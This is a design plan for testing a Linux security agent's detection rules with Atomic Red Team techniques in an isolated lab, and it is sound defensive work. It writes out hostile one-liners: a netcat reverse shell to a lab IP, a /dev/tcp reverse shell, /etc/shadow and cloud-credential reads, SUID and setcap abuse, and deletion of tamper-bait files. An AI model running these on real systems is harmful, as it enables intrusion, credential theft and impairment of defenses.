# T10.7 V2 — Atomic Red Team Sweep (curated Linux TTPs)

**Status:** DESIGN — doc-only. Awaiting owner approval of the TTP matrix
before V2 execution (Step 2). No engine code, no wire changes (design
§9). The agent under test is the shipped `main` build (engine **68
rules** after T9.5.1 added `NN-L-FIM-024`).

**Parent design:** `docs/design/TAPPA10_7_ADVERSARIAL_VALIDATION_DESIGN.md`
(RFC RESOLVED 2026-05-21). This document is the **V2** commit of the §12
plan, narrowed to the owner-curated technique set and extended with the
custom `T1562.001` honeypot-tamper scenarios that did not exist when the
design was authored against 61 rules.

**Date:** 2026-05-22.

---

## 0. Scope delta vs the design doc

The design §12 split V2 (process + FIM) from V3 (NET + CHAIN). The owner
directive for this commit reframes V2 as a **curated Atomic Red Team
sweep** across the seven NN-validated MITRE techniques **plus** a custom
`T1562.001` test for the anti-tamper honeypot:

> Coverage: NN-tested TTPs — **T1003, T1059, T1547, T1548, T1611, T1041,
> T1071** + custom **T1562.001** (the `atomic-red-team` repo has no
> `T1562` Linux atomic for our honeypot, so we author one).

Consequences, recorded so the reframing is auditable, not silent:

- **NET/CHAIN overlap (T1041, T1071).** These are network/correlation
  techniques the design assigned to V3. They appear in the V2 matrix
  because the curated set names them, and they carry the design's
  **PCAP-mandatory** requirement (§13-Q6). If owner prefers to keep
  packet-evidence runs in V3, rows §3.6–§3.7 move there wholesale — the
  mapping is unchanged, only the commit they execute in.
- **Document location.** Per the owner directive this V2 plan and its
  evidence live under `docs/adversarial/`. The design §10 nominal home
  is `docs/validation/`. V6/V8 report assembly reconciles the two so the
  published `REPORT.md` lands where §13-Q8 specifies. Tracked as a
  doc-location nit, not a scope change.
- **Curated index.** The full reproducible `atomics/` clone lives on
  `kalidev` (§13-Q2, V1). This document **is** the curated Linux
  execution index for these eight techniques; the design's
  `atomic-index.md` is the union of V2–V4 curated indices.

---

## 1. Environment (as provisioned in V1)

| Role | Host | IP | Network | Snapshot to revert to |
|---|---|---|---|---|
| Target (PRODUCTION mode) | `northnarrowdev` | `192.168.56.20` | `intnet-adversarial` | `v1-pre-t10-7-attack` |
| Attacker | `kalidev` | `192.168.56.10` | `intnet-adversarial` | `v2-toolkit-installed` |

- **Isolation invariant (§2.1):** `intnet-adversarial` is an Internal
  Network; the target has **no NAT**, ever. Kali's NAT was detached
  before the `v2-toolkit-installed` snapshot. C2 beacons (T1041/T1071)
  egress **only** to `192.168.56.10` — never the public internet.
- **Access:** `kali@kalidev` → `forty@192.168.56.20` over SSH key auth
  (passwordless). TTPs are launched either (a) **remotely** — Kali drives
  a tool that reaches across the wire (Sliver/MSF/scans), or (b)
  **locally on target** — Kali SSHes in and runs the atomic on
  `northnarrowdev` (most Atomic Red Team Linux atomics, which assume
  local code execution; consistent with the §1.4 threat model:
  post-access detection).
- **Toolkit on Kali (`v2-toolkit-installed`):** Atomic Red Team (336
  TTPs, full clone) + `Invoke-AtomicRedTeam`/PowerShell, Sliver C2,
  Metasploit, LinPEAS, LaZagne. (Pupy/Caldera per V4/optional.)

---

## 2. Coverage methodology

### 2.1 Definitions

- **Mapped rule:** an NN rule a TTP is expected to trip. One Atomic test
  may map to several rules; one rule may be mapped by several TTPs.
- **Applicable rule (denominator):** a mapped rule that is **not N/A**.
  N/A exclusions follow the design §4 / §13-Q1 denominator rules:
  - **DNS-payload rules** `NN-L-NET-004/005/014` — **N/A, BLOCKED on T4
    DNS refit** (Bug 2/3). `T1071.004` (DNS) rows are therefore N/A.
  - **argv-dependent process discrimination** — **N/A, routed to T10.6**
    (Detection Depth Refit). Where an `R0xx` predicate needs argv we
    don't yet emit, the miss is a **sensor gap → T10.6**, never a V2 FAIL
    (§6.3 triage class 2).
- **TTP verdict:** `PASS` if every applicable mapped rule fires as
  expected (right rule_id, right tier, within the latency budget);
  `PARTIAL` if some-but-not-all fire; `FAIL` if an applicable mapped rule
  with no triage excuse misses; `N/A` if all mapped rules are excluded.

### 2.2 The two gates (§13-Q1)

1. **Aggregate gate — 80%.** `applicable rules PASS / applicable rules`
   across this curated set must be **≥ 80%**. Feeds the §8.1 coverage
   matrix; the V2 slice is one input to the report headline.
2. **Critical sub-gate — 100% (hard).** Every **Critical-tier** rule in
   V2 scope must `PASS`. The Critical rules this sweep exercises:
   - `R001/R002/R003/R004` — exec-from-`{/tmp,/dev/shm,/var/tmp,memfd}`
     → **Critical / KillProcessTree / COMBAT** (`T1059`).
   - `NN-L-FIM-002_NewSuidBinary` — new SUID root binary (`T1548.001`).
   - `NN-L-FIM-024_AntiTamperHoneypotModified` — honeypot tamper
     (custom `T1562.001`) → **Critical / KillProcessTree / COMBAT**.
   - `NN-L-CHAIN-001_CredReadThenEgress` — cred→exfil correlation
     (`T1041`) → **Critical / KillProcessTree / COMBAT**.
   A single Critical miss with no valid triage excuse **fails V2**
   regardless of the aggregate %.

### 2.3 Reproducibility

Each executed row records the snapshot generation it ran against, a
UTC timestamp, the exact command (+ Atomic GUID where applicable), and
the audit-chain event ids — so any row can be re-run against the same
state in V7 re-runs.

---

## 3. TTP execution matrix

Column key: **Tier** = highest expected NN verdict tier; **Resp** =
expected response action; **Ev** = evidence method (L=log+audit chain,
S=screencap, P=full PCAP, H=sha256 of all). Per §11/§13-Q6, **P** is
mandatory only for NET + CHAIN rows.

### 3.1 `T1059` — Command and Scripting Interpreter (Unix Shell)

Launch: **local on target** (Kali SSHes in, runs each atomic).

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 59-1 | `cp /bin/sh /tmp/sh && /tmp/sh -c id` | `R001_ExecFromTmp` | Critical | KillProcessTree / COMBAT | L S H | fire |
| 59-2 | exec from `/dev/shm` | `R002_ExecFromDevShm` | Critical | KillProcessTree / COMBAT | L S H | fire |
| 59-3 | exec from `/var/tmp` | `R003_ExecFromVarTmp` | Critical | KillProcessTree / COMBAT | L S H | fire |
| 59-4 | memfd / `/proc/self/fd` fileless exec (T1620-shaped) | `R004_ExecFromProcSelfFd` | Critical | KillProcessTree / COMBAT | L S H | fire |
| 59-5 | `nc -e /bin/sh 192.168.56.10 4444` | `R005_NetcatExec` (+ `NN-L-NET-008` if egress) | High | KillProcess | L S P H | fire |
| 59-6 | bash `/dev/tcp` reverse shell | `R006_ReverseShellTooling` | High | KillProcess | L S P H | fire |
| 59-7 | shell spawned from non-standard path | `R017_ShellFromNonstandardPath` | Medium | Alert | L S H | fire |

Atomic source: `T1059.004` (Unix Shell) atomics + MSF
`exploit/multi/handler` dropping to `/tmp` for 59-1. argv-only variants
(e.g. base64-decode discrimination) → **N/A (T10.6)**.

### 3.2 `T1003` — OS Credential Dumping

Launch: **local on target**.

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 3-1 | `T1003.008` cat `/etc/shadow` | `NN-L-FIM-003_SensitiveConfigModified` (read-watch) | High | Alert | L S H | fire |
| 3-2 | read `~/.aws/credentials` | `NN-L-FIM-011_AwsCredsRead` | High | KillProcess | L S H | fire |
| 3-3 | read Azure creds | `NN-L-FIM-012_AzureCredsRead` | High | KillProcess | L S H | fire |
| 3-4 | read GCP creds | `NN-L-FIM-013_GcpCredsRead` | High | KillProcess | L S H | fire |
| 3-5 | read `~/.docker/config.json` | `NN-L-FIM-014_DockerCredsRead` | High | KillProcess | L S H | fire |
| 3-6 | read browser login DB | `NN-L-FIM-015_BrowserCredsAccessed` | High | KillProcess | L S H | fire |
| 3-7 | read password-manager DB | `NN-L-FIM-016_PasswordManagerDbAccessed` | High | KillProcess | L S H | fire |
| 3-8 | read GPG keyring | `NN-L-FIM-017_GpgKeyringAccessed` | High | KillProcess | L S H | fire |

`T1003.007` (proc filesystem scrape) is largely argv/`/proc`-walk shaped;
where it doesn't reach a watched cred path → **N/A (T10.6)**. Fixture
cred files seeded by the V1 prod bootstrap; deep cred-dump tooling
(LaZagne/Pupy) is the **V4** angle — V2 uses Atomic + manual `cat`.

### 3.3 `T1547` — Boot or Logon Autostart Execution

Launch: **local on target**. **State-mutating → per-TTP revert** (§2.4).

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 47-1 | `T1547.006` `insmod`/`modprobe` flagged kmod | `R011_KernelModuleTooling` | High | KillProcess | L S H | fire |
| 47-2 | write a `.ko` under module path | `NN-L-FIM-008_KernelModuleModified` | High | Alert | L S H | fire |
| 47-3 | drop a `systemd` `.service` unit | `NN-L-FIM-009_SystemdUnitDropped` | High | Alert | L S H | fire |
| 47-4 | drop a `systemd` `.timer` unit | `NN-L-FIM-023_SystemdTimerCreated` | High | Alert | L S H | fire |
| 47-5 | create a cron drop-in | `NN-L-FIM-007_CronDropInCreated` | High | Alert | L S H | fire |

### 3.4 `T1548` — Abuse Elevation Control Mechanism

Launch: **local on target**. **State-mutating (SUID/setcap) → per-TTP
revert.**

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 48-1 | `T1548.001` `chmod u+s` on a new root binary | `NN-L-FIM-002_NewSuidBinary` | **Critical** | KillProcess | L S H | fire |
| 48-2 | `setcap cap_setuid+ep` on a binary | `R012_SetcapTooling` | High | KillProcess | L S H | fire |

`T1548.003` (sudo caching) is argv/config shaped → **N/A (T10.6)** unless
it lands on a watched path.

### 3.5 `T1611` — Escape to Host

Launch: **local on target**.

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 611-1 | `runc`/namespace-escape-shaped exec | `R013_NamespaceEscapeTooling` | High | KillProcessTree | L S H | fire |

Privileged-container / sensitive-mount atomics that depend on container
runtime presence and argv → **N/A (T10.6)** where the predicate needs
argv we don't emit.

### 3.6 `T1041` — Exfiltration Over C2 Channel  *(PCAP-mandatory; V3 overlap)*

Launch: **Sliver beacon from target → `192.168.56.10`**.

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 41-1 | large outbound transfer over Sliver session | `NN-L-NET-009_ByteAnomaly` | High | Throttle/Block | L S **P** H | fire |
| 41-2 | one PID reads a cred store **then** beacons out | `NN-L-CHAIN-001_CredReadThenEgress` | **Critical** | KillProcessTree / COMBAT | L S **P** H | fire |
| 41-N | negative control: cred-read + egress in **different PIDs** | `NN-L-CHAIN-001` | — | — | L **P** H | **no fire** (validates per-PID single-trigger) |

### 3.7 `T1071` — Application Layer Protocol  *(PCAP-mandatory; V3 overlap)*

Launch: **Sliver/MSF from target → `192.168.56.10`**.

| # | Atomic / command | Mapped rule(s) | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 71-1 | beacon to a blocklisted IP | `NN-L-NET-001_OutboundToBlockedIp` | High | Block | L S **P** H | fire |
| 71-2 | beacon to a blocklisted TLD | `NN-L-NET-002_OutboundToBlockedTld` | High | Block | L S **P** H | fire |
| 71-3 | Sliver mTLS handshake (bad JA3) | `NN-L-NET-003_BadJa3` | High | Block | L S **P** H | fire |
| 71-4 | egress from a `/tmp`-exec'd process | `NN-L-NET-008_OutboundFromTmpExec` | Critical | KillProcessTree | L S **P** H | fire |
| 71-5 | periodic Sliver beacon (window detector) | `NN-L-NET-013_Beacon` | High | Block | L S **P** H | fire |
| 71-D | `T1071.004` DNS C2 | `NN-L-NET-004/005/014` | — | — | — | **N/A — BLOCKED on T4** |

### 3.8 Custom `T1562.001` — Impair Defenses: Disable or Modify Tools

The headline V2 addition. See §4 for full scenarios.

| # | Command | Mapped rule | Tier | Resp | Ev | Expected |
|---|---|---|---|---|---|---|
| 62-1 | `rm /etc/northnarrow/kill_switch.conf` | `NN-L-FIM-024` | **Critical** | KillProcessTree / COMBAT | L S H | fire |
| 62-2 | `rm /etc/northnarrow/maintenance.mode` | `NN-L-FIM-024` | **Critical** | KillProcessTree / COMBAT | L S H | fire |
| 62-3 | `rm /run/northnarrow/pause.flag` | `NN-L-FIM-024` | **Critical** | KillProcessTree / COMBAT | L S H | fire |
| 62-4 | `rm /var/lib/northnarrow/disable.token` | `NN-L-FIM-024` | **Critical** | KillProcessTree / COMBAT | L S H | fire |
| 62-5 | mass `rm /etc/northnarrow/*.conf /run/northnarrow/* /var/lib/northnarrow/*` | `NN-L-FIM-024` (×N) | **Critical** | KillProcessTree / COMBAT | L S H | fire (one verdict per bait, no dup-suppression gaps) |

---

## 4. Custom `T1562.001` honeypot-tamper scenarios (NN-L-FIM-024)

### 4.1 Why custom

`atomic-red-team` ships no Linux `T1562` atomic that targets a
NorthNarrow-specific control surface. `NN-L-FIM-024` (T9.5.1) watches
**ten inert bait files** whose names advertise a fake agent off-switch.
NN never reads them and no operator workflow writes them, so **any
mutation — create / modify / delete / rename — is an adversary probing
for a kill switch.** Verdict: **Critical → KillProcessTree → COMBAT**,
MITRE `T1562.001`. (Rule: `agent/src/fim/rules.rs:1288`,
`HONEYPOT_PATHS` at `:1275`; bait content map
`agent/src/fim/honeypot.rs:36`.)

The ten bait paths (across the three dirs an attacker inspects):

```
/etc/northnarrow/agent.dev.lock          /var/lib/northnarrow/shutdown.signal
/etc/northnarrow/kill_switch.conf        /var/lib/northnarrow/disable.token
/etc/northnarrow/maintenance.mode        /var/lib/northnarrow/override.config
/etc/northnarrow/debug_disable.flag      /run/northnarrow/pause.flag
/etc/northnarrow/agent.legacy.conf       /run/northnarrow/unload.signal
```

### 4.2 Positive scenarios (each → one Critical verdict)

Run via SSH as a non-agent UID on the target. Each is its own row; the
state-mutating ones get a **per-TTP revert** before the next so a prior
delete can't mask the next (§2.4 / §13-Q10).

1. **62-1 delete (config):** `rm -f /etc/northnarrow/kill_switch.conf`
2. **62-2 delete (config):** `rm -f /etc/northnarrow/maintenance.mode`
3. **62-3 delete (runtime tmpfs):** `rm -f /run/northnarrow/pause.flag`
4. **62-4 delete (state):** `rm -f /var/lib/northnarrow/disable.token`

For each: expect `NN-L-FIM-024_AntiTamperHoneypotModified`, tier
Critical, response KillProcessTree + COMBAT chain raised, attributed to
the SSH session's PID/UID. Capture the agent's **restore** behaviour
(`check_and_restore`, `honeypot.rs:82`) — the bait should be
re-materialised after the verdict, evidenced in the log slice.

### 4.3 Mass-tamper scenario (62-5)

```
rm -f /etc/northnarrow/*.conf /run/northnarrow/* /var/lib/northnarrow/*
```

This sweeps multiple bait files (plus real `.v1` configs — note any
`NN-L-FIM-003` co-fires) in one process. Assertions:

- **One `NN-L-FIM-024` verdict per bait file tampered** — no dropped
  events under burst, no incorrect dup-suppression collapsing N deletes
  into one. (Watches for the kind of first-match/dedup gap the T10.6
  closeout flagged.)
- Single attributed PID across the burst → still **Critical /
  KillProcessTree**; the COMBAT chain raises once for the PID, not N
  times (confirm chain-raise idempotency, not a stream of COMBATs).
- Real-config co-fires (`NN-L-FIM-003`) are recorded but do **not**
  downgrade the FIM-024 verdict.

### 4.4 Negative controls (must NOT fire)

Mirror the rule's own guards so the test proves selectivity, not just
sensitivity:

1. **Self-write guard:** confirm the agent's own boot integrity refresh
   (`modifier_pid == own_pid`) does **not** self-detonate FIM-024
   (rule self-guard, `rules.rs:1293`). Evidence: a clean boot/restart log
   slice with no FIM-024 verdict.
2. **Read is not mutation:** `cat /etc/northnarrow/kill_switch.conf`
   (and `stat`) → **no fire** (only create/modify/delete/rename are
   mutations).
3. **Non-bait path:** `rm` a sibling non-bait file under the same dir
   (e.g. a real but non-watched temp) → **no FIM-024** (may fire other
   FIM rules; assert FIM-024 specifically silent).
4. **Evidence-leak contract:** grep the emitted verdict
   strings/journald for `honeypot|decoy|bait|canary` → **must be
   absent** (a compromised-host log reader must not learn the file is
   bait; the rule name is `AntiTamperHoneypotModified` only in source,
   not in attacker-readable output — verify the wire/log surface).

---

## 5. Execution sequence + snapshot points (§6.1 / §13-Q10)

Per-**family** revert by default; per-**TTP** revert for any
state-mutating test. Both VMs timestamped and tied to snapshot
generation per run.

| Phase | TTP rows | Launch | Snapshot cadence | PCAP |
|---|---|---|---|---|
| A | §3.1 `T1059` (59-1..7) | local | revert target → `v1-pre-t10-7-attack` after phase | 59-5/6 only |
| B | §3.2 `T1003` (3-1..8) | local | per-family revert after phase (reads → low state churn) | no |
| C | §3.3 `T1547` (47-1..5) | local | **per-TTP** revert (persistence drops) | no |
| D | §3.4 `T1548` (48-1..2) | local | **per-TTP** revert (SUID/setcap persist) | no |
| E | §3.5 `T1611` (611-1) | local | per-family revert | no |
| F | §3.6 `T1041` + §3.7 `T1071` | Sliver/MSF wire | per-family revert; Kali → `v2-toolkit-installed` between | **full PCAP** |
| G | §3.8 `T1562.001` (62-1..5) | local (SSH) | **per-TTP** revert (deletes/mass-rm); mass-rm last | no |

Phase G runs **last** and per-TTP because each scenario deletes bait the
next would otherwise find missing. Phase F runs the only wire-egress
work — capture full PCAP for the whole phase window.

---

## 6. Evidence collection (§6.2 / §11)

Per row, one record = the matrix row + four artifacts:

- **(a) command** — exact invocation + Atomic GUID where applicable.
- **(b) log** — agent audit-chain slice + `journalctl -u northnarrow`
  around the verdict, pulled via the read-only shared folder.
- **(c) screencap** — verdict/posture surface still (short clip for the
  CHAIN-001 correlation demo), filename keyed to `rule_id`.
- **(d) latency** — event→verdict from audit-chain timestamps.
- **PCAP** — full capture for phase F (NET+CHAIN) only (§13-Q6).
- **Hash** — sha256 every artifact; archive under
  `docs/adversarial/evidence/<run-id>/` (reconciled to
  `docs/validation/` at V6/V8 per §0).

Non-PASS rows are triaged **before** being logged as an engine verdict
(§6.3): rule-logic gap → V7 hot-fix candidate; sensor gap → T10.6
backlog (not a V2 FAIL); config gap → config fix + re-run.

---

## 7. Cross-references

- Engine rule-count pin: `agent/src/decision/tests.rs::default_engine_has_sixtyeight_rules_across_all_families`
  (the 68-rule validation surface; `default_engine_pins_all_sixtyeight_rule_ids` is the authoritative list).
- FIM-024 rule + bait paths: `agent/src/fim/rules.rs:1268`, `agent/src/fim/honeypot.rs`.
- FIM-024 priv-e2e: `agent/tests/honeypot_tamper_e2e.rs` (the synthetic
  baseline this sweep supersedes with real `rm`).
- ADE context blocks checked as row evidence: `agent/src/ade/fim_template.rs`,
  `agent/src/ade/chain_template.rs` (D8 `rule-context`).
- Backlog bounding the N/A set: **T10.6** (argv + correlation refit),
  **T4 DNS refit** (NET-004/005/014 N/A).

---

## 8. Open items for owner ruling (Step 1 → Step 2 gate)

1. **NET/CHAIN placement (§0):** keep T1041/T1071 (phases F) in V2 with
   PCAP, or move them to V3 execution? Mapping is identical either way.
2. **T1003.007 proc-scrape:** accept as N/A→T10.6, or author a
   contrived watched-path variant to force a row?
3. **Evidence dir:** confirm `docs/adversarial/evidence/` for V2, with
   V6/V8 reconciliation to `docs/validation/` — or land directly in
   `docs/validation/` now?

**HALT.** Awaiting owner approval of this matrix before V2 Step 2
execution.
